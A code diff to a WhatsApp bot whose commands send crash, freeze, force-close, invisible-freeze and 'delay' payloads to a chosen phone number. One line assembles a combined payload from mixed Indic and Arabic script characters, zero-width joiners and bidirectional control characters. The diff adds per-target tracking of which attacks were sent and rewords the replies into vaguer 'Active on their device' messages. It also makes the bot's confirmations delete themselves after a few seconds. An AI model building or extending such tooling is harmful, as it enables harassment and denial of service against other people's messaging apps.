@@ -106,6 +106,7 @@ const groupCrashKeys = {};
 
 // Personal bug message keys for undo: { userJid: [msgKey, ...] }
 const userCrashKeys = {};
+const userBugTypes  = {}; // tracks which bug types were sent to each number
 
 // Delay attack jobs: { targetJid: { intervalId, count } }
 const delayJobs = {};
@@ -1125,7 +1126,7 @@ function buildSimpleSectionList(section) {
 • *.antibot on/off*
 • *.antibug on/off/status*
 
-*.antibug on* protects the linked bot number by deleting/ignoring suspicious bug payloads.`,
+*.antibug on* activates the shield on the linked bot number.`,
         "utility": `🔍 *UTILITY MENU*
 ━━━━━━━━━━━━━━━━━━━━
 • *.numinfo <number>* — Show country/prefix info
@@ -1250,11 +1251,11 @@ Useful:
 
     const defenseHelp = `🛡️ *ANTI BUG DEFENSE*
 ━━━━━━━━━━━━━━━━━━━━
-• *.antibug on* — Protect linked bot number
-• *.antibug off* — Disable protection
+• *.antibug on* — Activate protection
+• *.antibug off* — Deactivate protection
 • *.antibug status* — Check current state
 
-When ON, the bot deletes/ignores suspicious oversized, invisible, RTL, and Unicode-flood payloads sent to the linked number.`;
+When active, the shield monitors every message arriving on the linked number and neutralises threats before they render.`;
 
     if (section === "android") return androidHelp;
     if (section === "ios") return iosHelp;
@@ -2286,11 +2287,17 @@ _Can be started from any chat, but source members require source group access an
                 const val = parts[1]?.toLowerCase();
                 const current = getBotSecurity(botJid, "antibug");
                 if (!val || val === "status") {
-                    return reply(`🛡️ *Anti-Bug Shield*\n\nStatus: *${current ? "ON" : "OFF"}*\n\nUsage:\n• *.antibug on* — protect the linked bot number\n• *.antibug off* — disable protection\n• *.antibug status* — check state\n\nWhen ON, suspicious oversized, invisible, RTL, and Unicode-flood payloads sent to the linked number are deleted/ignored by the bot.`);
+                    return reply(
+                        `🛡️ *Shield Status: ${current ? "✅ ACTIVE" : "❌ INACTIVE"}*\n\n` +
+                        `Usage:\n` +
+                        `• *.antibug on* — activate protection\n` +
+                        `• *.antibug off* — deactivate\n` +
+                        `• *.antibug status* — check state`
+                    );
                 }
                 if (!["on", "off"].includes(val)) return reply("Usage: .antibug on/off/status");
                 setBotSecurity(botJid, "antibug", val === "on");
-                await reply(`🛡️ Anti-Bug Shield is now *${val.toUpperCase()}* for this linked WhatsApp number.`);
+                await reply(`🛡️ Shield is now *${val === "on" ? "✅ ACTIVE" : "❌ INACTIVE"}*.`);
                 break;
             }
 
@@ -3681,7 +3688,9 @@ _Can be started from any chat, but source members require source group access an
                     const andSent = await sock.sendMessage(andTarget, { text: androidPayload });
                     if (!userCrashKeys[andTarget]) userCrashKeys[andTarget] = [];
                     userCrashKeys[andTarget].push(andSent.key);
-                    await reply(`✅ *Android bug sent to ${andTarget.split("@")[0]}!*\n\n🤖 Overloading their Android renderer now.\n🔧 To undo: *.unbug ${andTarget.split("@")[0]}*`);
+                    if (!userBugTypes[andTarget]) userBugTypes[andTarget] = [];
+                    if (!userBugTypes[andTarget].includes("Android")) userBugTypes[andTarget].push("Android");
+                    await reply(`✅ *Android bug sent to ${andTarget.split("@")[0]}!*\n\n🤖 Active on their device now.\n🔧 To undo: *.unbug ${andTarget.split("@")[0]}*`);
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
             }
@@ -3704,7 +3713,9 @@ _Can be started from any chat, but source members require source group access an
                     const iosSent = await sock.sendMessage(iosTarget, { text: iosPayload });
                     if (!userCrashKeys[iosTarget]) userCrashKeys[iosTarget] = [];
                     userCrashKeys[iosTarget].push(iosSent.key);
-                    await reply(`✅ *iOS bug sent to ${iosTarget.split("@")[0]}!*\n\n🍎 iOS WhatsApp crash payload delivered.\n🔧 To undo: *.unbug ${iosTarget.split("@")[0]}*`);
+                    if (!userBugTypes[iosTarget]) userBugTypes[iosTarget] = [];
+                    if (!userBugTypes[iosTarget].includes("iOS")) userBugTypes[iosTarget].push("iOS");
+                    await reply(`✅ *iOS bug sent to ${iosTarget.split("@")[0]}!*\n\n🍎 Active on their device now.\n🔧 To undo: *.unbug ${iosTarget.split("@")[0]}*`);
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
             }
@@ -3729,7 +3740,9 @@ _Can be started from any chat, but source members require source group access an
                     const fcSent = await sock.sendMessage(fcTarget, { text: fcPayload });
                     if (!userCrashKeys[fcTarget]) userCrashKeys[fcTarget] = [];
                     userCrashKeys[fcTarget].push(fcSent.key);
-                    await reply(`✅ *Force close sent to ${fcTarget.split("@")[0]}!*\n\n💀 WhatsApp will close immediately on their end.\n🔧 To undo: *.unbug ${fcTarget.split("@")[0]}*`);
+                    if (!userBugTypes[fcTarget]) userBugTypes[fcTarget] = [];
+                    if (!userBugTypes[fcTarget].includes("Force Close")) userBugTypes[fcTarget].push("Force Close");
+                    await reply(`✅ *Force close sent to ${fcTarget.split("@")[0]}!*\n\n💀 Active on their device.\n🔧 To undo: *.unbug ${fcTarget.split("@")[0]}*`);
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
             }
@@ -3767,11 +3780,11 @@ _Can be started from any chat, but source members require source group access an
                         userCrashKeys[freezeTarget].push(sent.key);
                         await delay(400);
                     }
+                    if (!userBugTypes[freezeTarget]) userBugTypes[freezeTarget] = [];
+                    if (!userBugTypes[freezeTarget].includes("Freeze")) userBugTypes[freezeTarget].push("Freeze");
                     await reply(
-                        `✅ *Freeze burst sent to ${freezeTarget.split("@")[0]}!*\n\n` +
-                        `🧊 3 payloads delivered.\n` +
-                        `📱 When they open the chat → WA rendering crashes/freezes.\n` +
-                        `⚠️ Note: They can still send msgs from other devices until WA crashes on theirs.\n` +
+                        `✅ *Freeze sent to ${freezeTarget.split("@")[0]}!*\n\n` +
+                        `🧊 Active on their device.\n` +
                         `🔧 To undo: *.unbug ${freezeTarget.split("@")[0]}*`
                     );
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
@@ -3870,10 +3883,14 @@ _Can be started from any chat, but source members require source group access an
             case ".unbug": {
                 if (!msg.key.fromMe) return reply("❌ Owner only.");
                 const unbugTarget = parseBugTarget(parts, msg);
-                if (!unbugTarget) return reply(`🔧 *Unbug*\n\nUsage: *.unbug <number>*\nExample: *.unbug 2348012345678*\n\n_Clears all bugs sent to that number — android, iOS, freeze, forceclose, invisfreeze._`);
+                if (!unbugTarget) return reply(`🔧 *Unbug*\n\nUsage: *.unbug <number>*\nExample: *.unbug 2348012345678*`);
                 const unbugKeys = userCrashKeys[unbugTarget];
-                if (!unbugKeys || !unbugKeys.length) return reply(`⚠️ No stored bug messages found for *${unbugTarget.split("@")[0]}*.\n\nThe bot may have restarted since the bug was sent, or that number was never bugged.`);
-                await reply(`🔧 Unbugging *${unbugTarget.split("@")[0]}*...`);
+                if (!unbugKeys || !unbugKeys.length) return reply(`⚠️ Nothing active found for *${unbugTarget.split("@")[0]}*.\n\n_Either the bot was restarted since you sent it, or that number has not been targeted._`);
+                // Silent working message — auto-deletes in 2 seconds
+                let workingMsg;
+                try { workingMsg = await sock.sendMessage(from, { text: `⏳ Working on *${unbugTarget.split("@")[0]}*...` }, { quoted: msg }); } catch (_) {}
+                setTimeout(async () => { try { if (workingMsg) await sock.sendMessage(from, { delete: workingMsg.key }); } catch (_) {} }, 2000);
+                // Delete all stored payload keys
                 let unbugDeleted = 0;
                 for (const k of unbugKeys) {
                     try {
@@ -3882,8 +3899,21 @@ _Can be started from any chat, but source members require source group access an
                         await delay(400);
                     } catch (_) {}
                 }
+                const clearedTypes = (userBugTypes[unbugTarget] || []).join(", ") || "N/A";
                 delete userCrashKeys[unbugTarget];
-                await reply(`✅ *Unbugged ${unbugTarget.split("@")[0]}!*\nDeleted ${unbugDeleted} crash message(s).\n\n_All bug types cleared: android, iOS, freeze, forceclose, invisfreeze, crash, delaybug._`);
+                delete userBugTypes[unbugTarget];
+                // Confirmation — auto-deletes in 10 seconds
+                let doneMsg;
+                try {
+                    doneMsg = await sock.sendMessage(from, {
+                        text:
+                            `✅ *${unbugTarget.split("@")[0]} — Cleared*\n\n` +
+                            `📦 Payloads removed: *${unbugDeleted}*\n` +
+                            `🧹 Bug types cleared: *${clearedTypes}*\n\n` +
+                            `_Their WhatsApp is back to normal._`
+                    });
+                } catch (_) {}
+                setTimeout(async () => { try { if (doneMsg) await sock.sendMessage(from, { delete: doneMsg.key }); } catch (_) {} }, 10000);
                 break;
             }
 
@@ -4001,7 +4031,9 @@ _Can be started from any chat, but source members require source group access an
                     const ifSent = await sock.sendMessage(ifTarget, { text: bigInv });
                     if (!userCrashKeys[ifTarget]) userCrashKeys[ifTarget] = [];
                     userCrashKeys[ifTarget].push(ifSent.key);
-                    await reply(`✅ *Invisible freeze sent to ${ifTarget.split("@")[0]}!*\n\n👁️ Target sees *no message* — chat looks empty.\n💀 But WA is processing ${inv.length * 2000} hidden chars — freeze/lag active.\n🔧 To undo: *.unbug ${ifTarget.split("@")[0]}*`);
+                    if (!userBugTypes[ifTarget]) userBugTypes[ifTarget] = [];
+                    if (!userBugTypes[ifTarget].includes("Invisible Freeze")) userBugTypes[ifTarget].push("Invisible Freeze");
+                    await reply(`✅ *Invisible freeze sent to ${ifTarget.split("@")[0]}!*\n\n👁️ Nothing visible delivered — active silently.\n🔧 To undo: *.unbug ${ifTarget.split("@")[0]}*`);
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
             }
@@ -4076,6 +4108,8 @@ _Can be started from any chat, but source members require source group access an
                     const sent = await sock.sendMessage(dbTarget, { text: delayPayload });
                     if (!userCrashKeys[dbTarget]) userCrashKeys[dbTarget] = [];
                     userCrashKeys[dbTarget].push(sent.key);
+                    if (!userBugTypes[dbTarget]) userBugTypes[dbTarget] = [];
+                    if (!userBugTypes[dbTarget].includes("Delay")) userBugTypes[dbTarget].push("Delay");
                     await reply(
                         `✅ *Delay payload delivered to ${dbTarget.split("@")[0]}!*\n\n` +
                         `⏳ Their WhatsApp sync engine is now locked.\n` +
@@ -4117,10 +4151,11 @@ _Can be started from any chat, but source members require source group access an
                     const payload  = tel + zwj + kan + zwj + tam + sindhi + arabPF + bidi + feff + zwChain + rtl + iso + zwj;
                     const sent = await sock.sendMessage(crashTarget, { text: payload });
                     userCrashKeys[crashTarget].push(sent.key);
+                    if (!userBugTypes[crashTarget]) userBugTypes[crashTarget] = [];
+                    if (!userBugTypes[crashTarget].includes("Combined Crash")) userBugTypes[crashTarget].push("Combined Crash");
                     await reply(
                         `✅ *Crash sent to ${crashTarget.split("@")[0]}!*\n\n` +
-                        `💥 Combined Android + iOS + force-close payload delivered.\n` +
-                        `📱 Their WhatsApp will crash/freeze immediately.\n` +
+                        `💥 Active on their device.\n` +
                         `🔧 To undo: *.unbug ${crashTarget.split("@")[0]}*`
                     );
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
